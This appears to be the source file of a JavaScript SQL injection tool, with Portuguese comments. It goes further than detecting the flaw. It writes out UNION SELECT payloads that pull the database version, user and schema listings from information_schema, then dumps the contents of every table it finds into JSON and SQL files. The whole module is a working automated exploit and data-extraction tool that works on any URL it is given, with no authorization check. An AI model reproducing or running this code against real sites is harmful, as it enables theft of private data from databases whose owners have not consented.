import fs from 'fs/promises';
import { axiosInstance } from './http-client.js';
import {
  DETECTION_PAYLOADS,
  COLUMN_PAYLOADS,
  DATA_EXTRACTION_PAYLOADS
} from './config.js';
import { urlStore } from './url-store.js';
import { delay, sanitizePayload, validateUrl, sanitizeFilename, formatTimestamp, extractDomain } from './utils.js';
import pLimit from 'p-limit';

/**
 * @typedef {Object} SQLInjectionResult
 * @property {boolean} vulnerable
 * @property {string[]} columns
 * @property {Set<string>} tables
 * @property {Set<string>} databases
 * @property {Map<string, string[]>} tableData
 * @property {{ version: string | null, user: string | null, currentDb: string | null }} databaseInfo
 * @property {string[]} successfulPayloads
 */

/**
 * @typedef {Object} ScanConfig
 * @property {number} requestDelay - Atraso entre requisições (ms).
 * @property {number} maxConcurrency - Máximo de requisições simultâneas.
 * @property {number} maxPayloadLength - Tamanho máximo do payload.
 */

/** Configurações padrão do scanner */
const SCAN_CONFIG = {
  requestDelay: 100,
  maxConcurrency: 3,
  maxPayloadLength: 1000
};

/**
 * Registra logs com nível e timestamp.
 * @param {string} level - Nível do log (INFO, WARN, ERROR).
 * @param {string} message - Mensagem do log.
 */
function log(level, message) {
  console.log(`[${formatTimestamp()}] [${level}] ${message}`);
}

/**
 * Testa uma URL para vulnerabilidades de SQL Injection.
 * @param {string} url - URL a ser testada.
 * @param {Partial<ScanConfig>} [config] - Configurações opcionais.
 * @returns {Promise<SQLInjectionResult>} Resultado do teste.
 */
export async function testSQLInjection(url, config = {}) {
  if (!validateUrl(url)) {
    log('ERROR', 'Invalid URL provided');
    throw new Error('Invalid URL provided');
  }

  const scanConfig = { ...SCAN_CONFIG, ...config };

  /** @type {SQLInjectionResult} */
  const result = {
    vulnerable: false,
    columns: [],
    tables: new Set(),
    databases: new Set(),
    tableData: new Map(),
    databaseInfo: {
      version: null,
      user: null,
      currentDb: null
    },
    successfulPayloads: []
  };

  try {
    const isVulnerable = await testBasicVulnerability(url, result, scanConfig);
    if (!isVulnerable) {
      log('INFO', 'No vulnerabilities detected');
      return result;
    }

    result.vulnerable = true;
    log('INFO', 'Basic vulnerability confirmed, starting comprehensive scan...');

    const columnCount = await findColumnCount(url, scanConfig);
    if (columnCount <= 0) {
      log('WARN', 'No columns found, stopping scan');
      return result;
    }

    log('INFO', `Found ${columnCount} columns`);

    await Promise.all([
      extractSystemInfo(url, columnCount, result, scanConfig),
      extractDatabaseSchemas(url, columnCount, result, scanConfig)
    ]);

    const limit = pLimit(scanConfig.maxConcurrency);
    await Promise.all(
      Array.from(result.databases).map(dbName =>
        limit(() => extractDatabaseStructure(url, columnCount, dbName, result, scanConfig))
      )
    );

    await dumpAllTables(url, columnCount, result, scanConfig);

    const domain = extractDomain(url) || 'unknown';
    const timestamp = formatTimestamp();
    await Promise.all([
      saveResultsToJSON(result, `sql_injection_${sanitizeFilename(domain)}_${timestamp}.json`),
      saveResultsToSQL(result, `sql_dump_${sanitizeFilename(domain)}_${timestamp}.sql`)
    ]);
  } catch (error) {
    log('ERROR', `Fatal error during scan: ${error.message}`);
    throw error;
  }

  return result;
}

/**
 * Testa vulnerabilidades básicas de SQL Injection.
 * @param {string} url - URL a ser testada.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {ScanConfig} config - Configurações do scanner.
 * @returns {Promise<boolean>} Se a URL é vulnerável.
 */
async function testBasicVulnerability(url, result, config) {
  for (const payload of DETECTION_PAYLOADS) {
    const sanitizedPayload = sanitizePayload(payload, config.maxPayloadLength);
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, sanitizedPayload);
        const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
        const responseText = response.data.toLowerCase();

        if (responseText.match(/sql|error|syntax/i)) {
          log('INFO', `SQL injection detected with payload: ${sanitizedPayload}`);
          result.successfulPayloads.push(sanitizedPayload);
          return true;
        }
      }
      await delay(config.requestDelay);
    } catch (error) {
      log('WARN', `Error testing payload ${sanitizedPayload}: ${error.message}`);
      continue;
    }
  }
  return false;
}

/**
 * Encontra o número de colunas na consulta vulnerável.
 * @param {string} url - URL a ser testada.
 * @param {ScanConfig} config - Configurações do scanner.
 * @returns {Promise<number>} Número de colunas.
 */
async function findColumnCount(url, config) {
  for (let i = 0; i < COLUMN_PAYLOADS.length; i++) {
    const payload = sanitizePayload(COLUMN_PAYLOADS[i], config.maxPayloadLength);
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, payload);
        const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
        if (!response.data.toLowerCase().includes('error')) {
          return i + 1;
        }
      }
      await delay(config.requestDelay);
    } catch (error) {
      log('WARN', `Error testing column payload ${i + 1}: ${error.message}`);
      continue;
    }
  }
  return 0;
}

/**
 * Extrai informações do sistema (versão, usuário, banco atual).
 * @param {string} url - URL vulnerável.
 * @param {number} columnCount - Número de colunas.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {ScanConfig} config - Configurações do scanner.
 */
async function extractSystemInfo(url, columnCount, result, config) {
  log('INFO', 'Extracting system information...');
  const systemInfoPayloads = [
    { key: 'version', payload: `' UNION SELECT @@version,${Array(columnCount - 1).fill('NULL').join(',')}--` },
    { key: 'user', payload: `' UNION SELECT user(),${Array(columnCount - 1).fill('NULL').join(',')}--` },
    { key: 'currentDb', payload: `' UNION SELECT database(),${Array(columnCount - 1).fill('NULL').join(',')}--` }
  ];

  for (const { key, payload } of systemInfoPayloads) {
    const sanitizedPayload = sanitizePayload(payload, config.maxPayloadLength);
    try {
      const testUrl = new URL(url);
      for (const [param] of testUrl.searchParams) {
        testUrl.searchParams.set(param, sanitizedPayload);
        const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
        const data = extractDataFromResponse(response.data);
        if (data) {
          result.databaseInfo[key] = data;
        }
      }
      await delay(config.requestDelay);
    } catch (error) {
      log('WARN', `Error extracting ${key}: ${error.message}`);
    }
  }
}

/**
 * Extrai esquemas de bancos de dados.
 * @param {string} url - URL vulnerável.
 * @param {number} columnCount - Número de colunas.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {ScanConfig} config - Configurações do scanner.
 */
async function extractDatabaseSchemas(url, columnCount, result, config) {
  log('INFO', 'Enumerating database schemas...');
  const payload = sanitizePayload(
    `' UNION SELECT CONCAT(schema_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.schemata--`,
    config.maxPayloadLength
  );

  try {
    const testUrl = new URL(url);
    for (const [param] of testUrl.searchParams) {
      testUrl.searchParams.set(param, payload);
      const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
      const schemas = extractListFromResponse(response.data);
      schemas
        .filter(schema => !schema.includes('information_schema') && !schema.includes('mysql'))
        .forEach(schema => result.databases.add(schema));
    }
  } catch (error) {
    log('ERROR', `Error extracting schemas: ${error.message}`);
  }
}

/**
 * Extrai estrutura do banco de dados (tabelas e colunas).
 * @param {string} url - URL vulnerável.
 * @param {number} columnCount - Número de colunas.
 * @param {string} dbName - Nome do banco.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {ScanConfig} config - Configurações do scanner.
 */
async function extractDatabaseStructure(url, columnCount, dbName, result, config) {
  log('INFO', `Extracting structure for database: ${dbName}`);
  const tablePayload = sanitizePayload(
    `' UNION SELECT CONCAT(table_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.tables WHERE table_schema='${dbName}'--`,
    config.maxPayloadLength
  );

  try {
    const testUrl = new URL(url);
    for (const [param] of testUrl.searchParams) {
      testUrl.searchParams.set(param, tablePayload);
      const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
      const tables = extractListFromResponse(response.data);

      const limit = pLimit(config.maxConcurrency);
      await Promise.all(
        tables.map(table =>
          limit(async () => {
            result.tables.add(table);
            const columnPayload = sanitizePayload(
              `' UNION SELECT CONCAT(column_name,'::'),${Array(columnCount - 1).fill('NULL').join(',')} FROM information_schema.columns WHERE table_schema='${dbName}' AND table_name='${table}'--`,
              config.maxPayloadLength
            );
            testUrl.searchParams.set(param, columnPayload);
            const columnResponse = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
            const columns = extractListFromResponse(columnResponse.data);
            result.columns.push(...columns.map(col => `${dbName}.${table}.${col}`)); // Qualificar colunas
          })
        )
      );
    }
  } catch (error) {
    log('ERROR', `Error extracting structure for ${dbName}: ${error.message}`);
  }
}

/**
 * Extrai dados de todas as tabelas.
 * @param {string} url - URL vulnerável.
 * @param {number} columnCount - Número de colunas.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {ScanConfig} config - Configurações do scanner.
 */
async function dumpAllTables(url, columnCount, result, config) {
  log('INFO', 'Attempting to dump all tables...');
  const limit = pLimit(config.maxConcurrency);

  await Promise.all(
    Array.from(result.tables).map(table =>
      limit(async () => {
        log('INFO', `Dumping table: ${table}`);
        const columns = result.columns.filter(col => col.includes(table));
        if (columns.length === 0) {
          log('WARN', `No columns found for table ${table}`);
          return;
        }

        const dumpPayload = sanitizePayload(
          `' UNION SELECT CONCAT_WS('::',${columns.map(col => col.split('.').pop()).join(',')}),${Array(columnCount - 1).fill('NULL').join(',')} FROM ${table}--`,
          config.maxPayloadLength
        );

        try {
          const testUrl = new URL(url);
          for (const [param] of testUrl.searchParams) {
            testUrl.searchParams.set(param, dumpPayload);
            const response = await axiosInstance.get(testUrl.toString(), { timeout: 5000 });
            const extractedData = extractListFromResponse(response.data);
            if (extractedData.length > 0) {
              result.tableData.set(table, extractedData);
            }
          }
        } catch (error) {
          log('ERROR', `Error dumping table ${table}: ${error.message}`);
        }
      })
    )
  );
}

/**
 * Salva resultados em JSON.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {string} outputFile - Nome do arquivo de saída.
 */
async function saveResultsToJSON(result, outputFile) {
  const serializedResult = {
    ...result,
    tables: Array.from(result.tables),
    databases: Array.from(result.databases),
    tableData: Object.fromEntries(result.tableData)
  };

  try {
    await fs.writeFile(outputFile, JSON.stringify(serializedResult, null, 2));
    log('INFO', `Results saved to ${outputFile}`);
  } catch (error) {
    log('ERROR', `Error saving JSON results: ${error.message}`);
    throw error;
  }
}

/**
 * Salva resultados em formato SQL.
 * @param {SQLInjectionResult} result - Objeto de resultado.
 * @param {string} outputFile - Nome do arquivo de saída.
 */
async function saveResultsToSQL(result, outputFile) {
  const sqlDump = [];

  for (const [tableName, rows] of result.tableData.entries()) {
    sqlDump.push(`-- Dumping data for table ${tableName}`);
    const columns = result.columns.filter(col => col.includes(tableName)).map(col => col.split('.').pop());
    if (columns.length === 0) continue;

    sqlDump.push(`CREATE TABLE IF NOT EXISTS ${tableName} (${columns.map(col => `${col} TEXT`).join(', ')});`);
    rows.forEach(row => {
      const values = row
        .split('::')
        .map(value => `'${value.replace(/'/g, "''")}'`)
        .join(', ');
      sqlDump.push(`INSERT INTO ${tableName} (${columns.join(', ')}) VALUES (${values});`);
    });
    sqlDump.push('\n');
  }

  try {
    await fs.writeFile(outputFile, sqlDump.join('\n'));
    log('INFO', `SQL dump saved to ${outputFile}`);
  } catch (error) {
    log('ERROR', `Error saving SQL dump: ${error.message}`);
    throw error;
  }
}

/**
 * Extrai um dado de uma resposta.
 * @param {string} responseText - Texto da resposta.
 * @returns {string | null} Dado extraído.
 */
function extractDataFromResponse(responseText) {
  const matches = responseText.match(/([a-zA-Z0-9_.-]+)::/);
  return matches ? matches[1] : null;
}

/**
 * Extrai uma lista de dados de uma resposta.
 * @param {string} responseText - Texto da resposta.
 * @returns {string[]} Lista de dados.
 */
function extractListFromResponse(responseText) {
  const matches = responseText.match(/([a-zA-Z0-9_.-]+)::/g) || [];
  return matches.map(m => m.replace('::', '')).filter(item => item.trim());
}